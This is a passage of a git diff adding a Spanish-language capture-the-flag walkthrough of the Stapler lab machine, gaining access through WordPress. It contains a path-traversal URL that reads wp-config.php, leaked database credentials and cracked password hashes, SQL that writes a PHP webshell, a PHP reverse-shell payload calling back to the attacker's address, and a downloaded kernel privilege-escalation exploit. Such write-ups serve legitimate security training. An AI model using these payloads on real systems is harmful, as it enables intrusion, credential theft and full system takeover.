@@ -252,11 +252,169 @@ User peter may run the following commands on red:
 
 <img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler7.jpg" width="80%"></img>
 
+## Explotando Vulnerabilidades: Método 02 (a través de WORDPRESS)
+
+### 1. Enumerar toda la información de los servicios HTTP
+En el puerto TCP/80 tenemos dos archivos. No lo encontré con el GOBUSTER pero si con NIKTO. Nada importante.
+
+```
+root@kali:~/STAPLER# nikto -h http://192.168.78.140
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.78.140
++ Target Hostname:    192.168.78.140
++ Target Port:        80
++ Start Time:         2021-02-23 19:12:35 (GMT-5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
++ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
++ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
++ End Time:           2021-02-23 19:12:50 (GMT-5) (15 seconds)
+---------------------------------------------------------------------------
+```
+
+En el puerto TCP/12380 encontramos cosas importantes:
+- Funciona a través de SSL (cosa muy rara, es decir, muestra resultado por HTTP y también por HTTPs, cosas que solo pasan en CTFs)
+- Hay 03 carpetas: /admin112233/, /blogblog/ y /phpmyadmin/
+
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler8.jpg" width="80%"></img>
+
+### 2. Enumeramos usuarios del Wordpress y buscamos vulnerabilidades
+En la carpeta /blogblog/ tenemos un WORDPRESS y toca buscarles vulnerabilidades.
+```
+wpscan --api-token API_KEY --url=https://192.168.78.140:12380/blogblog/ --disable-tls-checks -e ap,u --plugins-detection aggressive  > wpscan1.txt
+```
+El resultado muestra lo siguiente:
+- Múltiples vulnerabilidades en el core de Wordpress: XSS y SQLi (es una opción explotar el SQLi).
+- 04 plugins: advanced-video-embed, akismet, shortcode-ui, two-factor. Al parecer ninguno tiene alguna vulnerabilidad importante.
+- Enumeración de archivos y carpetas: https://192.168.78.140:12380/blogblog/wp-content
+- Enumeramos usuarios: elly, peter, john, barry, heather, garry, harry, scott, kathy, tim.
+
+### 3. Explotamos alguna vulnerabilidad de Wordpress.
+- Una opción es probar usuarios y contraseñas, al igual que lo hicimos en el Método 01.
+- Otra opción es buscar archivos importantes en las carpetas. Vamos por este.
+
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler9.jpg" width="80%"></img>
+
+-  Vamos aprovechar una vulnerabilidad en el PLUGIN "advanced-video-embed". En lo personal no se me hubiera ocurrido buscar una vulnerabilidad aqui porque el WPSCAN no indica nada al respecto, sin embargo, Google si indica una vulnerabilidad en la versión 01 del plugin. 
+Moraleja: Nunca confiarse de las tools, siempre buscar manualmente.
+
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler10.jpg" width="80%"></img>
+
+- En exploit-db encontramos una POC sobre la vulnerabilidad: https://www.exploit-db.com/exploits/39646 (toca leer y documentarse sobre la vulnerabilidad).
+- La vulnerabilidad lee un archivo que le pasamos en el parámetro THUMB y luego lo coloca como imagen (toca leer el script de la POC).
+```
+https://192.168.78.140:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=110000000000000000L&short=1&term=1&thumb=../wp-config.php
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler11.jpg" width="80%"></img>
+
+- Descargamos el archivo y lo analizamos. Encontramos el acceso a  mysql.
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler12.jpg" width="80%"></img>
+```
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+/** MySQL database username */
+define('DB_USER', 'root');
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+```
+
+### 4. Ingresamos a la Base de Datos MYSQL
+- Listamos los usuarios de la BD Wordpress.
+```
+1	John	$P$B7889EMq/erHIuZapMB8GEizebcIy9.	john
+2	Elly	$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0	elly
+3	Peter	$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0	peter
+4	barry	$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0	barry
+5	heather	$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10	heather
+6	garry	$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1	garry
+7	harry	$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0	harry
+8	scott	$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1	scott
+9	kathy	$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0	kathy
+10	tim	$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0	tim
+11	ZOE	$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1	zoe
+12	Dave	$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.	dave
+13	Simon	$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0	simon
+14	Abby	$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.	abby
+15	Vicki	$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131	vicki
+16	Pam	$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0	pam
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler13.jpg" width="80%"></img>
+
+- CRACKING hash WORDPRESS
+```
+hashcat -m 400 -a 0 -o cracking.txt wordpresshash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 400 -a 0 -o cracking.txt wordpresshash.txt wordpressusers.txt
+
+root@kali:~/STAPLER# cat cracking.txt 
+$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1:football
+$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1:cookie
+$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0:monkey
+$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0:coolgirl
+$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0:washere
+$P$B7889EMq/erHIuZapMB8GEizebcIy9.:incorrect
+$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0:thumb
+$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0:0520
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler14.jpg" width="80%"></img>
+
+- El hash: $P$B7889EMq/erHIuZapMB8GEizebcIy9 corresponde al usuario "john. Este usuario tiene altos privilegios en Wordpress.
+
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler15.jpg" width="80%"></img>
 
 
+### 5. Upload a webshell
+Tenemos dos (02) maneras de subir un webshell:
+
+1. A través de PHPMYADMIN y sentencias SQL. La ruta /var/www/https/ debe ser adivinada (no es una ruta comun).
+```
+SELECT "<?php phpinfo(); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/test.php' 
+```
+
+2. Cargamos un webshell para obtener conexión reversa:
+```
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/cmd.php' 
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler16.jpg" width="80%"></img>
+
+3. Ejecutamos una shell reversa:
+```
+https://192.168.78.140:12380/blogblog/wp-content/uploads/cmd.php?cmd=php%20-r%20%27$sock=fsockopen(%22192.168.78.131%22,159);$proc=proc_open(%22/bin/sh%20-i%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler17.jpg" width="80%"></img>
 
 
+### 6. Elevamos privilegios
+- Podemos aplicar la técnica anterior de buscar archivos interesantes como en el Método 01, sin embargo, vamos a utilizar otra.
+- Vamos a buscar un exploit para escalar privilegios. Ensayo y error con los exploits.
 
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler18.jpg" width="80%"></img>
 
+- Descargamos y descomprimimos los archivos:
+```
+wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+www-data@red:/tmp$ mkdir 39772
+www-data@red:/tmp$ cp 39772.zip 39772
+www-data@red:/tmp/39772$ unzip -e 39772.zip
+www-data@red:/tmp/39772$ cd 39772
+www-data@red:/tmp/39772/39772$ tar -xvf exploit.tar
+<72/ebpf_mapfd_doubleput_exploit$ chmod +x compile.sh                        
+www-data@red:/tmp/39772/39772/ebpf_mapfd_doubleput_exploit$ chmod +x doubleput
+./doubleput
+```
+<img src="https://github.com/El-Palomo/STAPLER/blob/main/stapler19.jpg" width="80%"></img>
 
 
